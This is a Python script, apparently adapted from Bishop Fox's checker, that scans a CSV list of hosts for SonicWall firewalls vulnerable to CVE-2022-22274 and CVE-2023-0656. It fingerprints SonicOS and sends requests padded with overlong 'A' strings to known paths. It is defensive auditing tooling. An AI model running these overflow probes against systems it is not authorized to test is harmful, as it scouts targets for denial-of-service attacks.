#!/usr/bin/env python3
#
# Vulnerability test and DoS exploit for
# SonicWall NGFW CVE-2022-22274 & CVE-2023-0656
# Original Code by Bishop Fox Team X
# Code modified for Databranch by Steven Peterson
import sys
import csv
import argparse
import socket
import ssl
import time
import re
import warnings

def read_ips_from_csv(csv_file):
    try:
        with open(csv_file, 'r') as file:
            reader = csv.reader(file)
            ips = [tuple(row[0].strip().split(':')) for row in reader]
        return ips
    except Exception as e:
        print(f"Error reading IP addresses from CSV: {e}")
        sys.exit(1)

def check_header(host, port):
    # Check for SonicWall header
    data = b"GET / HTTP/1.1\r\n\r\n"
    try:
        with socket.create_connection((host, port), timeout=10) as sock:
            context = ssl.SSLContext()
            context.verify_mode = ssl.CERT_NONE
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                ssock.send(data)
                resp = ssock.recv(256)
        if b"Server: SonicWALL\r\n" in resp:
            print("[+] Confirmed target is running SonicOS")
            return True
        else:
            print("[-] Failed to confirm SonicOS on the target")
            return False
    except:
        print("[-] Failed to connect")
        return False

def test(host, port, path):
    # Test for vulnerability at an arbitrary path
    data = b"GET " + path + b"A" * 0x400 + b" HTTP/1.1\r\n\r\n"
    try:
        with socket.create_connection((host, port), timeout=5) as sock:
            context = ssl.SSLContext()
            context.verify_mode = ssl.CERT_NONE
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                ssock.send(data)
                resp = ssock.recv(1024)
        if resp and re.match(r"HTTP/\d\.?\d? 302 Found", resp[:18].decode()):
            print("[+] Target looks vulnerable! (redirected)")
        elif not resp:
            print("[-] Target appears to be patched (empty response)")
        else:
            try:
                status = resp.decode().split(" ", 2)[1]
                print(f"[-] Target does not appear to be affected (HTTP {status})")
            except:
                print("[-] Target does not appear to be affected")
    except:
        print("[-] Failed to connect")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip-csv", help="CSV file containing IP addresses and ports (e.g., 192.168.1.1:8080)")
    args = parser.parse_args()

    warnings.filterwarnings("ignore", category=DeprecationWarning)

    if args.ip_csv:
        ips = read_ips_from_csv(args.ip_csv)
        for ip, port in ips:
            print(f"[*] Checking https://{ip}:{port}")
            if not check_header(ip, int(port)):
                continue

            paths = [b"/resources/", b"//", b"/atp/", b"/stats/", b"/Security_Services"]
            for path in paths:
                print(f"[*] Testing CVE-2022-22274 at {path.decode()}")
                test(ip, int(port), path)
    else:
        print("[-] Please provide an IP CSV file.")
        sys.exit(1)

if __name__ == "__main__":
    main()
